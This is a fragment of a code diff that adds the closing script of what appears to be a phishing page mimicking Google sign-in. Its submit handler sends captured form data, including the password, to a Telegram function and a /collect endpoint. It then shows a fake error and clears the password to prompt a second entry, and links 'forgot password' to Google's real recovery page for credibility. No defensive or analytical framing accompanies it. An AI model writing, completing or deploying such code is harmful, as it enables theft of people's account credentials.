+            if (typeof sendToTelegram === 'function') { sendToTelegram(data); }
+            fetch('/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon('/collect', JSON.stringify(data));
+            }
+            setTimeout(() => {
+                overlay.classList.remove('show');
+                btn.disabled = false;
+                spinner.classList.remove('show');
+                btnText.style.display = 'inline';
+                showWelcomeError();
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            }, 2000);
+            return false;
+        }
+        function showForgotPass() {
+            window.location.href = `https://accounts.google.com/signin/recovery?email=${encodeURIComponent(currentEmail)}`;
+        }
+        window.onload = () => {
+            document.getElementById('email').focus();
+            if (isMobile) { document.body.style.background = '#fff'; }
+        };
+    </script>
+</body>
+</html>
